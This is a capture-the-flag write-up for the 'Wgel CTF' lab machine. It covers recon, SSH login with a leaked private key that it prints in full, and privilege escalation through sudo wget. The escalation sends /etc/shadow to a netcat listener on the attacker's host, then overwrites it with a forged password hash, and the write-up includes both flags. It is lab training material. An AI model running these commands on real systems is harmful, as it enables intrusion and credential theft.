# Wgel CTF

--------------------------------------------------------------------

**TOOLS USED**: nmap, dirb, netcat, wget

--------------------------------------------------------------------

## GIVEN INFO


**IP Address**: 10.10.171.243

--------------------------------------------------------------------

## PROCEDURE

### 1. RECON

-sC: script scan<br>
-sV: probe open ports to determine service/version info<br>
```
nmap -sC -sV 10.10.171.243
```

![1.1](./imgs/1.1.png)

**EXPOSED PORT (SERVICE)**:<br>
    22 (ssh OpenSSH 7.2p2),<br>
    80 (http Apache httpd 2.14.18)

Enumerate hidden directories on webserver
```
dirb -u http://10.10.171.243 -w /usr/share/dirb/wordlists/common.txt
```

![1.2](./imgs/1.2.png)

Pages of Interest: /sitemap/.ssh

Found potential user Jessie in http://10.10.171.243/ source

![1.3](./imgs/1.3.png)

Found id_rsa (private key) at http://10.10.171.243/sitemap/.ssh

![1.4](./imgs/1.4.png)

### 2. SSH LOGIN

Copy private key to file
```
echo "-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----" > id_rsa
```

Log into ssh using found crendentials
```
ssh jessie@10.10.171.243 -i id_rsa
```

![2.1](./imgs/2.1.png)

Have to change permissions on id_rsa and then try again
```
chmod 600 id_rsa
ssh jessie@10.10.171.243 -i id_rsa
find /home/jessie -iname "*flag*"
```
![2.2](./imgs/2.2.png)

**USER FLAG**: 057c67131c3d5e42dd5cd3075b198ff6

### 3. PRIVILEGE ESCALATION

Check user privileges
```
sudo -l
```

![3.1](./imgs/3.1.png)

jessie can run wget as root with no password<br>
jessie can also run all commands as root using sudo (need password)

Start listener
```
nc -lnvp 4444 > shadow
```

Send /etc/shadows to host machine with wget
```
sudo /usr/bin/wget --post-file /etc/shadow 10.6.40.234:4444
```

![3.2](./imgs/3.2.png)

Now we can replace jessie's password hash with our own hash

Find hash algorithm on https://hashcat.net/wiki/doku.php?id=example_hashes

HASH: sha512crypt

Create password hash
```
openssl passwd -6 "1234"
```

![3.3](./imgs/3.3.png)


PASSWORD: 1234
HASH: $6$.PAbc1lM9LOOeZl4$Dq18IJTuUJuNfhVJmJI2GfwQxo55/scbJiQbm/Oyj6gtSt.fdNuMvnRy45QilcmRJXO0.S1.zTyH6gpexiwtx0

Replace jessie's old hash<br>
Replacing the root password hash with this one can also work

![3.4](./imgs/3.4.png)

Start server
```
python3 -m http.server
```

Replace old /etc/shadow and get root access
```
sudo /usr/bin/wget http://10.6.40.234:8000/shadow -O /etc/shadow
sudo bash
```

![3.5](./imgs/3.5.png)

**ROOT FLAG**: b1b968b37519ad1daa6408188649263d